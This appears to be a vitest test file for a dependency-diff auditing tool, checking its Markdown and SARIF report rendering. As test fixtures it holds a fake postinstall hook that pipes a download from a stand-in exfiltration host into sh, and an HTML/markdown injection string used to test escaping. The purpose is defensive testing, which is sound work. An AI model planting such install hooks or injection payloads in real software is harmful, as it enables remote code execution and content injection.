import { DepwardError, type Finding, type Severity } from "@depward/core";
import type { PackageChangeResult } from "@depward/diff";
import { describe, expect, test } from "vitest";
import { renderDiffMarkdown } from "../src/diff-markdown.ts";
import type { DiffView } from "@depward/diff";
import { renderDiffSarif } from "../src/diff-render.ts";

const DOCS = "https://github.com/lavitsamson/depward/blob/main/docs/findings.md";

function finding(id: string, severity: Severity, name: string, version: string, extra: Partial<Finding> = {}): Finding {
  return { id, severity, package: name, version, message: `${id} message`, evidence: [], docsUrl: `${DOCS}#${id}`, ...extra };
}

function pkg(name: string, risk: Severity, findings: Finding[], extra: Partial<PackageChangeResult> = {}): PackageChangeResult {
  return { kind: "updated", name, from: "1.0.0", to: "1.0.1", lockfiles: ["package-lock.json"], findings, errors: [], risk, ...extra };
}

function view(packages: PackageChangeResult[], extra: Partial<DiffView> = {}): DiffView {
  return { packages, findings: packages.flatMap((p) => p.findings), risk: packages[0]?.risk ?? "info", lockfiles: [], skipped: [], base: "0123456789abcdef0123", head: null, ...extra };
}

const critical = pkg(
  "foo",
  "critical",
  [
    finding("diff-new-install-script", "high", "foo", "1.0.1", {
      evidence: [{ file: "package.json", snippet: "postinstall: curl https://exfil.example.invalid | sh", detail: "new script" }],
    }),
    finding("diff-new-network-in-non-network-pkg", "high", "foo", "1.0.1", {
      evidence: Array.from({ length: 8 }, (_, i) => ({ file: "index.js", line: i + 1, snippet: "fetch(u)" })),
    }),
    finding("diff-publisher-changed", "medium", "foo", "1.0.1"),
  ],
  { line: 7 },
);
const low = pkg("bar", "low", [finding("diff-new-dependency", "low", "bar", "1.0.1")]);
const quiet = pkg("baz", "info", [finding("diff-new-capability", "info", "baz", "1.0.1")]);

describe("renderDiffMarkdown", () => {
  test("report shape", () => {
    const allowed = pkg("qux", "info", [], { allowedFindings: [finding("diff-new-endpoint", "medium", "qux", "1.0.1")] });
    const failed = pkg("down", "info", [], { errors: [new DepwardError("NETWORK", "registry timed out")] });
    const created: PackageChangeResult = {
      kind: "added",
      name: "fresh",
      to: "0.1.0",
      lockfiles: ["package-lock.json"],
      findings: [finding("low-downloads", "medium", "fresh", "0.1.0")],
      errors: [],
      risk: "medium",
    };
    expect(renderDiffMarkdown(view([critical, created, low, failed, quiet, allowed], { skipped: ["local@0.0.0"] }))).toMatchSnapshot();
  });

  test("high and critical sections open; lower risks collapsed", () => {
    const md = renderDiffMarkdown(view([critical, low]));
    expect(md).toContain("<details open><summary>🔴 <b>critical</b>");
    expect(md).toContain("<details><summary>🔵 <b>low</b>");
  });

  test("evidence is capped per finding", () => {
    const md = renderDiffMarkdown(view([critical]));
    expect(md).toContain("<code>index.js\\:5</code>");
    expect(md).not.toContain("<code>index.js\\:6</code>");
    expect(md).toContain("_and 3 more_");
  });

  test("untrusted strings cannot inject HTML, links, mentions, or control characters", () => {
    const evil = "<img src=x onerror=alert(1)>[x](https://evil.example)@octocat\u001b[31m‮";
    const p = pkg(evil, "high", [finding("diff-new-endpoint", "high", evil, "1.0.1", { message: evil, evidence: [{ file: evil, snippet: `${evil}${"A".repeat(400)}` }] })], {
      from: evil,
      to: "1.0.1|x",
    });
    const md = renderDiffMarkdown(view([p]));
    expect(md).not.toContain("<img");
    // Brackets are backslash-escaped, so no "](" can start a link.
    expect(md).not.toMatch(/(?<!\\)\]\(/);
    expect(md).not.toMatch(/@octocat/);
    expect(md).not.toContain("\u001b");
    expect(md).not.toContain("‮");
    expect(md).not.toContain("1.0.1|x");
    // Snippets are cut at 200 characters before escaping.
    expect(md).not.toContain("A".repeat(200));
  });

  test("a report too long for a comment keeps the worst packages and says what was left out", () => {
    const many = Array.from({ length: 400 }, (_, i) =>
      pkg(`pkg-${String(i).padStart(3, "0")}`, i < 5 ? "high" : "medium", [
        finding("diff-new-endpoint", i < 5 ? "high" : "medium", "x", "1.0.1", { evidence: Array.from({ length: 5 }, () => ({ file: "a.js", line: 1, snippet: "x".repeat(200) })) }),
      ]),
    );
    const md = renderDiffMarkdown(view(many), { maxLength: 20_000 });
    expect(md.length).toBeLessThanOrEqual(20_000);
    expect(md).toContain("pkg-000 1.0.0 → 1.0.1");
    expect(md).toMatch(/> The report did not fit in one comment: \d+ table rows and \d+ package sections left out\./);
    expect(md).toMatch(/\| … \| \| \| \+\d+ more packages \|/);
    expect(renderDiffMarkdown(view(many)).length).toBeLessThanOrEqual(60_000);
  });

  test("no changes", () => {
    expect(renderDiffMarkdown(view([]))).toBe("## depward: 0 dependency changes\n\nCompared with <code>0123456789ab</code> (merge-base) → the working tree.\n");
  });
});

describe("renderDiffSarif", () => {
  test("results point at the package's lockfile line", () => {
    const lockNote = finding("unsupported-lockfile", "medium", "yarn.lock", "");
    const v = view([critical, low], { findings: [...critical.findings, ...low.findings, lockNote], lockfiles: [{ path: "yarn.lock", format: null, counts: { added: 0, removed: 0, changed: 0 }, findings: [lockNote] }] });
    const sarif = JSON.parse(renderDiffSarif(v, { name: "depward" })) as {
      runs: { results: { ruleId: string; properties: { package: string }; locations: { physicalLocation: { artifactLocation: { uri: string }; region: { startLine: number } } }[] }[] }[];
    };
    const at = (pkgName: string): string[] =>
      (sarif.runs[0]?.results ?? []).filter((r) => r.properties.package === pkgName).map((r) => `${r.locations[0]?.physicalLocation.artifactLocation.uri}:${r.locations[0]?.physicalLocation.region.startLine}`);
    expect(new Set(at("foo"))).toEqual(new Set(["package-lock.json:7"]));
    expect(at("bar")).toEqual(["package-lock.json:1"]);
    expect(at("yarn.lock")).toEqual(["yarn.lock:1"]);
  });
});
